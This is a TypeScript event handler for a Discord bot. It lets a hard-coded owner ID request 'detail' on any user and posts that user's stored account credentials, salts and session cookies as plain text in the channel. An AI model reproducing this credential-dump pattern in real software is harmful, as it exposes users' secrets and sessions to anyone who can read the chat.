import { Events } from "discord.js";
import { Event } from "../interfaces/Event";
import { getAccounts } from "../utils/accountUtils";

const OWNER_ID = "283946584461410305";

const event: Event = {
  name: Events.MessageCreate,
  execute: async (client, message) => {
    if (message.author.bot) return;
    if (message.author.id !== OWNER_ID) return;

    const botMentionRegex = new RegExp(`^<@!?${client.user?.id}>\\s*`);
    if (!botMentionRegex.test(message.content)) return;

    const args = message.content
      .replace(botMentionRegex, "")
      .trim()
      .split(/\s+/);
    if (args[0]?.toLowerCase() !== "detail") return;

    const targetId = args[1] || message.author.id;

    const accounts = await getAccounts(client.db, targetId);
    if (!accounts || accounts.length === 0) {
      await message.reply(`No accounts found for user \`${targetId}\`.`);
      return;
    }

    const lines: string[] = [
      `**Account details for \`${targetId}\`** (${accounts.length} account(s))\n`,
    ];

    for (let i = 0; i < accounts.length; i++) {
      const acc = accounts[i];
      const info = acc.info || {};
      lines.push(`**[${i + 1}] ${info.nickname ?? "Unknown"}**`);
      lines.push("```");
      lines.push(`cred:   ${acc.cred ?? "N/A"}`);
      lines.push(`salt:   ${acc.salt ?? "N/A"}`);
      lines.push(`cookie: ${acc.cookie ?? "N/A"}`);
      lines.push("```");
    }

    const content = lines.join("\n");

    // Discord message limit: 2000 chars — split if needed
    if (content.length <= 2000) {
      await message.reply({ content });
    } else {
      const chunks: string[] = [];
      let current = "";
      for (const line of lines) {
        if (current.length + line.length + 1 > 1990) {
          chunks.push(current);
          current = "";
        }
        current += line + "\n";
      }
      if (current) chunks.push(current);
      for (const chunk of chunks) {
        await message.channel.send(chunk);
      }
    }
  },
};

export default event;
